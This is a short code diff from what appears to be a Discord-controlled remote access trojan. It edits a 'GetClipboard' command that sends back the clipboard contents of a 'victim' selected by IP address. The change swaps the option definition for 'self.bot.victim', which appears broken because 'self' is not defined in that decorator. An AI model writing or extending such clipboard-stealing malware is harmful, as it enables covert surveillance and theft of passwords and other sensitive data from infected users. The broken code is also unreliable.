@@ -12,9 +12,7 @@ class GetClipboard(commands.Cog):
         
     @commands.slash_command(
         description="Sends text contents of clipboard",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ],
+        options=[self.bot.victim],
     )
     async def get_clipboard(ctx, victim):
         if str(victim) == str(ip_addr):
